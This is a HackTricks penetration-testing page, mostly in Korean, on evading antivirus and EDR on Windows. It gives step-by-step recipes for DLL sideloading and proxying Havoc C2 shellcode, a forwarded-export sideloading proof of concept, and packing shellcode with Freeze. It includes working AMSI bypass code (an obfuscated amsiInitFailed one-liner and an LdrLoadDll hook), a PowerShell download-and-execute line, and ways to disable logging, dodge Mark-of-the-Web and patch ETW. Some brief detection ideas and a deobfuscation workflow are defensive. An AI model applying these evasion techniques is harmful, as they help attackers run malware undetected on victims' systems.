# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**이 페이지는** [**@m2rc_p**](https://twitter.com/m2rc_p)**에 의해 작성되었습니다!**

## Defender 중지

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender의 작동을 멈추게 하는 도구입니다.
- [no-defender](https://github.com/es3n1n/no-defender): 다른 AV를 가장하여 Windows Defender의 작동을 멈추게 하는 도구입니다.
- [관리자이면 Defender 비활성화](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

현재 AV들은 파일이 악성인지 여부를 검사하기 위해 정적 탐지, 동적 분석, 그리고 더 고급 EDR의 경우 행동 분석 같은 다양한 방법을 사용합니다.

### **Static detection**

정적 탐지는 바이너리나 스크립트 내의 알려진 악성 문자열 또는 바이트 배열을 표시하고, 또한 파일 자체에서 정보를 추출(예: 파일 설명, 회사명, 디지털 서명, 아이콘, 체크섬 등)하는 방식으로 이루어집니다. 이는 알려진 공개 도구를 사용하면 이미 분석되어 악성으로 표시되었을 가능성이 있어 더 쉽게 탐지될 수 있음을 의미합니다. 이러한 탐지를 우회하는 몇 가지 방법은 다음과 같습니다:

- **Encryption**

바이너리를 암호화하면 AV가 프로그램을 탐지할 방법이 없지만, 메모리에서 프로그램을 복호화하고 실행할 로더가 필요합니다.

- **Obfuscation**

때로는 바이너리나 스크립트의 몇몇 문자열을 변경하는 것만으로 AV를 통과할 수 있지만, 무엇을 난독화하느냐에 따라 시간이 많이 소요될 수 있습니다.

- **Custom tooling**

자체 도구를 개발하면 알려진 악성 시그니처가 없겠지만, 많은 시간과 노력이 필요합니다.

> [!TIP]
> Windows Defender의 정적 탐지에 대해 검사하는 좋은 방법은 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)입니다. 이 도구는 파일을 여러 세그먼트로 분할한 다음 각 세그먼트를 개별적으로 Defender에게 스캔하도록 하여 바이너리에서 어떤 문자열이나 바이트가 표시되었는지 정확히 알려줍니다.

실전적인 AV Evasion에 관한 이 [YouTube 재생목록](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)을 강력히 추천합니다.

### **Dynamic analysis**

동적 분석은 AV가 샌드박스에서 바이너리를 실행하고 악성 활동(예: 브라우저 비밀번호를 복호화해 읽으려 시도하거나 LSASS에 대해 minidump를 수행하는 행위 등)을 관찰하는 경우입니다. 이 부분은 다루기 좀 더 까다로울 수 있지만, 샌드박스를 회피하기 위해 할 수 있는 몇 가지 방법은 다음과 같습니다.

- **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
- **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
- **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.

Microsoft Defender의 샌드박스 컴퓨터 이름이 HAL9TH인 것으로 알려져 있으므로, 악성 코드를 실행하기 전에 컴퓨터 이름을 확인해 HAL9TH와 일치하면 Defender의 샌드박스 내부임을 의미하므로 프로그램을 종료하게 만들 수 있습니다.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

샌드박스에 대응하기 위한 [@mgeeky](https://twitter.com/mariuszbit)의 몇 가지 좋은 팁들

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

앞서 언급했듯, **public tools**는 결국 **탐지됩니다**, 그래서 스스로에게 물어보아야 합니다:

예를 들어 LSASS를 덤프하고 싶다면, **정말로 mimikatz를 사용해야 하나요**? 아니면 LSASS를 덤프하는 덜 알려진 다른 프로젝트를 사용할 수 있을까요.

정답은 아마 후자일 것입니다. 예로 mimikatz는 AV와 EDR에 의해 가장 많이, 그리고 가장 쉽게 탐지되는 도구 중 하나입니다. 프로젝트 자체는 훌륭하지만, AV를 우회하기 위해 사용하기에는 골칫거리인 경우가 많으므로 달성하려는 목표에 맞는 대안을 찾아보세요.

> [!TIP]
> 페이로드를 변형해 회피하려 할 때에는 Defender의 자동 샘플 제출(automatic sample submission)을 반드시 꺼두고, 장기적인 회피를 목표로 한다면 제발 **DO NOT UPLOAD TO VIRUSTOTAL** 하세요. 특정 AV에서 페이로드가 탐지되는지 확인하려면 해당 AV를 가상머신(VM)에 설치하고 자동 샘플 제출을 끈 후 그곳에서 충분히 테스트하세요.

## EXEs vs DLLs

가능할 때마다 회피를 위해 항상 **DLLs 사용을 우선시하세요**, 제 경험상 DLL 파일이 보통 **탐지율이 훨씬 낮고** 분석 대상이 되는 경우가 적습니다. 따라서 페이로드가 DLL로 실행될 수 있는 방법이 있다면 이는 탐지를 피하기 위한 아주 간단한 트릭이 됩니다.

아래 이미지에서 볼 수 있듯, Havoc의 DLL 페이로드는 antiscan.me에서 탐지율이 4/26인 반면 EXE 페이로드는 7/26의 탐지율을 보였습니다.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

이제 DLL 파일과 함께 사용해 훨씬 더 은밀해질 수 있는 몇 가지 트릭을 보여드리겠습니다.

## DLL Sideloading & Proxying

**DLL Sideloading**은 로더가 사용하는 DLL 검색 순서를 악용하여 피해자 애플리케이션과 악성 페이로드를 함께 배치하는 방식으로 작동합니다.

[Siofra](https://github.com/Cybereason/siofra)와 다음 powershell script를 사용하여 DLL Sideloading에 취약한 프로그램을 확인할 수 있습니다:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
이 명령은 "C:\Program Files\\" 안에서 DLL hijacking에 취약한 프로그램 목록과 이들이 로드하려고 시도하는 DLL 파일들을 출력합니다.

I highly recommend you **explore DLL Hijackable/Sideloadable programs yourself**, this technique is pretty stealthy done properly, but if you use publicly known DLL Sideloadable programs, you may get caught easily.

단순히 프로그램이 로드하기를 기대하는 이름의 악성 DLL을 배치하는 것만으로는 payload가 로드되지 않습니다. 프로그램은 해당 DLL 내부에 특정 함수들이 있을 것으로 기대하기 때문입니다. 이 문제를 해결하기 위해 우리는 **DLL Proxying/Forwarding**이라는 다른 기법을 사용할 것입니다.

**DLL Proxying**은 프록시(및 악성) DLL에서 원래 DLL로 프로그램이 호출하는 함수들을 전달하여 프로그램의 기능을 보존하면서 payload 실행을 처리할 수 있게 합니다.

I will be using the [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project from [@flangvik](https://twitter.com/Flangvik/)

These are the steps I followed:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
마지막 명령은 우리에게 2개의 파일을 제공합니다: DLL 소스 코드 템플릿과 이름이 변경된 원본 DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

우리의 shellcode ([SGN](https://github.com/EgeBalci/sgn)으로 인코딩된)과 proxy DLL은 모두 [antiscan.me](https://antiscan.me)에서 0/26 Detection rate를 기록했습니다! 성공이라고 볼 수 있습니다.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading에 관한 [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543)를 꼭 시청하시고, 우리가 더 자세히 다룬 내용을 더 배우려면 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)도 보시길 **강력히 권합니다**.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules는 실제로 "forwarders"인 함수를 export할 수 있습니다: 코드 대신 export 엔트리는 `TargetDll.TargetFunc` 형식의 ASCII 문자열을 포함합니다. 호출자가 export를 resolve할 때, Windows loader는 다음을 수행합니다:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

이해해야 할 주요 동작:
- `TargetDll`가 KnownDLL인 경우, 보호된 KnownDLLs 네임스페이스에서 제공됩니다 (예: ntdll, kernelbase, ole32).
- `TargetDll`가 KnownDLL이 아닌 경우, 모듈이 forward resolution을 수행하는 디렉터리를 포함한 일반적인 DLL 검색 순서가 사용됩니다.

이것은 간접적인 sideloading primitive를 가능하게 합니다: 함수가 non-KnownDLL 모듈 이름으로 포워딩된 signed DLL을 찾은 다음, 그 signed DLL과 동일한 디렉터리에 포워딩된 대상 모듈 이름과 정확히 일치하는 attacker-controlled DLL을 함께 둡니다. 포워딩된 export가 호출되면 로더는 forward를 해결하고 동일한 디렉터리에서 당신의 DLL을 로드해 DllMain을 실행합니다.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll`은 KnownDLL이 아니므로, 일반 검색 순서에 따라 해결됩니다.

PoC (copy-paste):
1) 서명된 시스템 DLL을 쓰기 가능한 폴더로 복사
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 같은 폴더에 악성 `NCRYPTPROV.dll`을 배치합니다. 최소한의 DllMain만으로 코드 실행이 가능하며; DllMain을 트리거하기 위해 포워딩된 함수를 구현할 필요가 없습니다.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 서명된 LOLBin으로 포워드를 트리거:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
- While resolving `KeyIsoSetAuditingInterface`, the loader follows the forward to `NCRYPTPROV.SetAuditingInterface`
- The loader then loads `NCRYPTPROV.dll` from `C:\test` and executes its `DllMain`
- If `SetAuditingInterface` is not implemented, you'll get a "missing API" error only after `DllMain` has already run

Hunting tips:
- Focus on forwarded exports where the target module is not a KnownDLL. KnownDLLs are listed under `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- You can enumerate forwarded exports with tooling such as:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 후보를 찾으려면 Windows 11 forwarder 인벤토리를 확인하세요: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- LOLBins(예: rundll32.exe)가 비시스템 경로에서 서명된 DLL을 로드한 다음 동일한 기본 이름을 가진 non-KnownDLLs를 해당 디렉터리에서 로드하는 것을 모니터링하세요
- 사용자 쓰기 가능 경로에서 발생하는 다음과 같은 프로세스/모듈 체인에 대해 경고하세요: `rundll32.exe` → 비시스템 `keyiso.dll` → `NCRYPTPROV.dll`
- 코드 무결성 정책(WDAC/AppLocker)을 적용하고 애플리케이션 디렉터리에서 쓰기+실행을 금지하세요

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze를 사용하여 shellcode를 은밀하게 로드하고 실행할 수 있습니다.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 회피는 단지 고양이와 쥐의 게임일 뿐이며, 오늘 통하는 방법이 내일 탐지될 수 있으니 절대 하나의 도구에만 의존하지 마세요. 가능하다면 여러 회피 기법을 연계해서 사용해 보세요.

## AMSI (Anti-Malware Scan Interface)

AMSI는 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"를 방지하기 위해 만들어졌습니다. 초기에는 AVs가 **files on disk**만 스캔할 수 있었기 때문에, 페이로드를 **directly in-memory**로 실행할 수 있다면 AV는 이를 막을 방법이 없었습니다.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (EXE, COM, MSI 또는 ActiveX 설치의 권한 상승)
- PowerShell (스크립트, 대화형 사용 및 동적 코드 평가)
- Windows Script Host (wscript.exe 및 cscript.exe)
- JavaScript and VBScript
- Office VBA macros

이 기능은 스크립트 내용을 암호화되지 않고 난독화되지 않은 형태로 노출하여 antivirus 솔루션이 스크립트 동작을 검사할 수 있게 합니다.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`를 앞에 붙이고 스크립트가 실행된 실행 파일의 경로(이 경우 powershell.exe)를 표시하는 것을 확인할 수 있습니다.

디스크에 파일을 남기지 않았음에도 AMSI 때문에 메모리 상에서 탐지되었습니다.

또한, **.NET 4.8**부터는 C# 코드도 AMSI를 통해 실행됩니다. 이는 `Assembly.Load(byte[])`를 통한 메모리 로드에도 영향을 미칩니다. 따라서 AMSI를 회피하려면 메모리 실행을 위해 낮은 버전의 .NET(예: 4.7.2 이하)을 사용하는 것이 권장됩니다.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Since AMSI mainly works with static detections, therefore, modifying the scripts you try to load can be a good way for evading detection.

However, AMSI has the capability of unobfuscating scripts even if it has multiple layers, so obfuscation could be a bad option depending on how it's done. This makes it not-so-straightforward to evade. Although, sometimes, all you need to do is change a couple of variable names and you'll be good, so it depends on how much something has been flagged.

- **AMSI Bypass**

Since AMSI is implemented by loading a DLL into the powershell (also cscript.exe, wscript.exe, etc.) process, it's possible to tamper with it easily even running as an unprivileged user. Due to this flaw in the implementation of AMSI, researchers have found multiple ways to evade AMSI scanning.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
현재 powershell 프로세스에서 AMSI를 사용할 수 없게 만드는 데 필요한 것은 powershell 코드 한 줄뿐이었다. 물론 이 한 줄은 AMSI 자체에서 탐지되었기 때문에, 이 기법을 사용하려면 약간의 수정이 필요하다.

다음은 제가 이 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)에서 가져온 수정된 AMSI bypass입니다.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
이 게시물이 공개되면 아마 탐지될 가능성이 높으니, 탐지되지 않은 상태로 남을 계획이라면 코드를 공개하지 마세요.

**Memory Patching**

이 기술은 처음에 [@RastaMouse](https://twitter.com/_RastaMouse/)가 발견했으며, 사용자 입력을 스캔하는 기능인 "AmsiScanBuffer" 함수의 주소를 amsi.dll에서 찾아 E_INVALIDARG 코드를 반환하도록 명령으로 덮어쓰는 방식입니다. 이렇게 하면 실제 스캔 결과가 0을 반환하고, 이는 클린 결과로 해석됩니다.

> [!TIP]
> 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)을(를) 참고하세요.

powershell로 AMSI를 우회하기 위한 다른 기법들도 많습니다. 자세한 내용은 [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) 및 [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)를 확인하세요.

### amsi.dll 로드를 방지하여 AMSI 차단 (LdrLoadDll hook)

AMSI는 현재 프로세스에 `amsi.dll`이 로드된 후에만 초기화됩니다. 언어에 구애받지 않는 강력한 바이패스는 요청된 모듈이 `amsi.dll`일 때 오류를 반환하도록 `ntdll!LdrLoadDll`에 사용자 모드 훅을 거는 것입니다. 그 결과 AMSI는 로드되지 않으며 해당 프로세스에서는 검사도 이루어지지 않습니다.

구현 개요 (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
참고
- PowerShell, WScript/CScript 및 custom loaders 등 AMSI를 로드하는 모든 환경에서 동작합니다 (AMSI를 로드하는 환경이면 어디서나).
- 긴 커맨드라인 흔적을 피하려면 스크립트를 stdin으로 전달(`PowerShell.exe -NoProfile -NonInteractive -Command -`)하는 방식과 함께 사용하세요.
- LOLBins를 통해 실행되는 loader들(예: `regsvr32`가 `DllRegisterServer`를 호출하는 경우)에서 사용되는 사례가 관찰되었습니다.

이 도구 [https://github.com/Flangvik/AMSI.fail] 는 AMSI를 우회하는 스크립트도 생성합니다.

**감지된 시그니처 제거**

현재 프로세스의 메모리에서 감지된 AMSI 시그니처를 제거하려면 **[https://github.com/cobbr/PSAmsi]** 및 **[https://github.com/RythmStick/AMSITrigger]** 같은 도구를 사용할 수 있습니다. 이 도구들은 현재 프로세스의 메모리를 스캔하여 AMSI 시그니처를 찾아 NOP 명령으로 덮어써 메모리에서 사실상 제거합니다.

**AMSI를 사용하는 AV/EDR 제품**

AMSI를 사용하는 AV/EDR 제품 목록은 **[https://github.com/subat0mik/whoamsi]**에서 확인할 수 있습니다.

**Powershell version 2 사용**
PowerShell version 2를 사용하면 AMSI가 로드되지 않으므로 스크립트를 AMSI에 의해 스캔당하지 않고 실행할 수 있습니다. 다음과 같이 할 수 있습니다:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging은 시스템에서 실행된 모든 PowerShell 명령을 기록할 수 있는 기능입니다. 이는 감사(auditing)나 문제 해결에 유용할 수 있지만, 탐지를 회피하려는 공격자에게는 **문제가 될 수 있습니다**.

PowerShell logging을 우회하기 위해 다음 기술을 사용할 수 있습니다:

- **Disable PowerShell Transcription and Module Logging**: 이 목적을 위해 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 같은 도구를 사용할 수 있습니다.
- **Use Powershell version 2**: PowerShell version 2를 사용하면 AMSI가 로드되지 않으므로 AMSI의 스캔 없이 스크립트를 실행할 수 있습니다. 이렇게 할 수 있습니다: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: 방어 기능이 없는 powershell을 생성하려면 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)를 사용하세요 (이는 Cobal Strike의 `powerpick`이 사용하는 방법입니다).


## Obfuscation

> [!TIP]
> 여러 난독화 기법은 데이터를 암호화하는 방식에 의존하는데, 이는 바이너리의 엔트로피를 증가시켜 AVs나 EDRs가 이를 탐지하기 쉽게 만듭니다. 이 점을 주의하고, 민감하거나 숨겨야 할 코드 섹션에만 암호화를 적용하는 것을 고려하세요.

### ConfuserEx로 보호된 .NET 바이너리의 난독화 해제

ConfuserEx 2(또는 상업적 포크)를 사용하는 악성코드를 분석할 때, 디컴파일러와 샌드박스를 차단하는 여러 레이어의 보호를 마주치는 것이 일반적입니다. 아래 워크플로우는 신뢰성 있게 거의 원본에 가까운 IL을 **복원**하며, 이후 dnSpy나 ILSpy 같은 도구로 C#으로 디컴파일할 수 있습니다.

1.  Anti-tampering 제거 – ConfuserEx는 모든 *method body*를 암호화하고 *module* 정적 생성자(`<Module>.cctor`) 안에서 복호화합니다. 또한 PE 체크섬을 패치하기 때문에 어떤 수정도 바이너리를 크래시시킬 수 있습니다. 암호화된 메타데이터 테이블을 찾고 XOR 키를 복구한 뒤 깨끗한 어셈블리를 재작성하려면 **AntiTamperKiller**를 사용하세요:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
출력에는 자체적인 6개의 anti-tamper 파라미터(`key0-key3`, `nameHash`, `internKey`)가 포함되어 있으며, 자체 언패커를 만들 때 유용할 수 있습니다.

2.  심볼 / 제어 흐름 복구 – *clean* 파일을 **de4dot-cex**(ConfuserEx를 인식하는 de4dot 포크)에 입력하세요.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
플래그:
• `-p crx` – ConfuserEx 2 프로필 선택  
• de4dot은 control-flow flattening을 되돌리고, 원래의 네임스페이스, 클래스 및 변수 이름을 복원하며 상수 문자열을 복호화합니다.

3.  Proxy-call 제거 – ConfuserEx는 직접 메서드 호출을 디컴파일을 더욱 방해하기 위해 경량 래퍼(일명 *proxy calls*)로 대체합니다. 이를 제거하려면 **ProxyCall-Remover**를 사용하세요:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
이 단계 후에는 불투명한 래퍼 함수(`Class8.smethod_10`, …) 대신 `Convert.FromBase64String` 또는 `AES.Create()` 같은 일반적인 .NET API가 보일 것입니다.

4.  수동 정리 – 결과 바이너리를 dnSpy에서 실행하고 큰 Base64 블롭이나 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 사용을 검색하여 *실제* 페이로드를 찾으세요. 종종 악성코드는 이를 `<Module>.byte_0` 안에서 초기화된 TLV 인코딩된 바이트 배열로 저장합니다.

위 체인은 악성 샘플을 실행할 필요 없이 실행 흐름을 복원하므로 오프라인 워크스테이션에서 작업할 때 유용합니다.

> 🛈  ConfuserEx는 `ConfusedByAttribute`라는 커스텀 어트리뷰트를 생성합니다. 이는 샘플을 자동 분류(triage)하기 위한 IOC로 사용할 수 있습니다.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목표는 [LLVM](http://www.llvm.org/) 컴파일 스위트의 오픈 소스 포크를 제공하여 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 및 변조 방지를 통해 소프트웨어 보안을 강화하는 것입니다.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 `C++11/14` 언어를 사용하여 외부 도구를 사용하거나 컴파일러를 수정하지 않고 컴파일 시점에 난독화된 코드를 생성하는 방법을 보여줍니다.
- [**obfy**](https://github.com/fritzone/obfy): C++ 템플릿 메타프로그래밍 프레임워크에 의해 생성된 난독화된 연산 레이어를 추가하여 애플리케이션을 크랙하려는 사람의 작업을 조금 더 어렵게 만듭니다.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 .exe, .dll, .sys 등을 포함한 다양한 PE 파일을 난독화할 수 있는 x64 binary obfuscator입니다.
- [**metame**](https://github.com/a0rtega/metame): Metame은 임의 실행 파일을 위한 단순한 metamorphic code 엔진입니다.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP (return-oriented programming)를 사용하여 LLVM 지원 언어를 대상으로 하는 세부적인 코드 난독화 프레임워크입니다. ROPfuscator는 일반 명령어를 ROP 체인으로 변환하여 어셈블리 코드 수준에서 프로그램을 난독화함으로써 일반적인 제어 흐름에 대한 우리의 직관을 방해합니다.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE Crypter입니다.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존 EXE/DLL을 shellcode로 변환한 다음 로드할 수 있습니다

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>인터넷에서 다운로드된 파일의 Zone.Identifier ADS를 확인하는 모습입니다.</p></figcaption></figure>

> [!TIP]
> **신뢰된** 서명 인증서로 서명된 실행 파일은 **SmartScreen을 유발하지 않습니다**.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW)는 Windows에서 애플리케이션과 시스템 구성요소가 이벤트를 기록할 수 있게 해주는 강력한 로깅 메커니즘입니다. 그러나 보안 제품이 악성 활동을 모니터링하고 탐지하는 데에도 사용될 수 있습니다.

AMSI가 비활성화(우회)되는 방식과 유사하게, 사용자 공간 프로세스의 **`EtwEventWrite`** 함수를 즉시 반환하도록 만들어 이벤트를 기록하지 않게 할 수도 있습니다. 이는 메모리에서 해당 함수를 패치하여 즉시 반환하게 함으로써 해당 프로세스의 ETW 로깅을 사실상 비활성화하는 방식입니다.

자세한 내용은 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) 및 [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**에서 확인할 수 있습니다.


## C# Assembly Reflection

메모리에서 C# 바이너리를 로드하는 것은 오래전부터 알려진 방법이며, AV에 걸리지 않고 포스트 익스플로잇 도구를 실행하는 매우 좋은 방법입니다.

